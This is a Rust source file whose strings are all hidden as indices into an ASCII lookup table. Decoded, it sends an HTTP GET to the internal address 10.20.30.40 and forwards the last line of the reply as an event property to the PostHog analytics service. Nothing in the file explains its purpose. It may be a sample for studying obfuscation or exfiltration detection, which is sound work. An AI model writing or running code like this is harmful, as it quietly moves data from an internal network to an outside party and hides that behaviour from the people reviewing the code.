use std::io::{self, Read, Write};
use std::net::{Ipv4Addr, TcpStream};

fn table() -> Vec<u8> {
    let mut v = vec![0; 32];
    for c in 32u8..=0x7e {
        v.push(c);
    }
    v
}

fn decode<const N: usize>(arr: [u8; N]) -> String {
    String::from_utf8(arr.to_vec()).unwrap()
}

fn lookup() -> io::Result<String> {
    let mut c = TcpStream::connect((Ipv4Addr::new(10, 20, 30, 40), 80))?;
    let a = table();
    let mut s = String::default();
    c.write_all(&[a[71], a[69], a[84], a[32], a[47]])?;
    c.flush()?;
    c.read_to_string(&mut s)?;
    Ok(s.lines().last().unwrap().to_string())
}

fn main() -> io::Result<()> {
    let a = table();
    let c = posthog_rs::client(
        posthog_rs::ClientOptionsBuilder::default()
            .api_key(decode([a[112], a[104], a[99], a[95]]))
            .build()
            .unwrap(),
    );
    let mut e = posthog_rs::Event::new(decode([a[116], a[121]]), decode([a[98], a[105]]));
    e.insert_prop(decode([a[97], a[115]]), lookup()?).unwrap();
    c.capture(e);
    c.shutdown();
    Ok(())
}
